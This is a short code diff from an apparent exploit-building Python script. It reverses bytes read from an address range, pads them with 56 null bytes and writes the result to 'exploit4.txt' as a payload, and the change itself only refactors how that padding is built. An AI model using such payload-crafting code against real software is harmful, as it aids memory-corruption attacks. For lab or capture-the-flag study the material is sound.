@@ -8,7 +8,10 @@ for i in range(4201265,4201323):
     for i in range(len(d),0,-2):
         output = output + d[i-2:i] + " "
 
-    out_buffer = "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" + output + "00 00 00 00"
+    fill_buffer = ""
+    for i in range(56):
+        fill_buffer = fill_buffer + "00 "
+    out_buffer = fill_buffer + output + "00 00 00 00"
 
     text_file = open("exploit4.txt", "w")
     text_file.write("%s" % out_buffer)
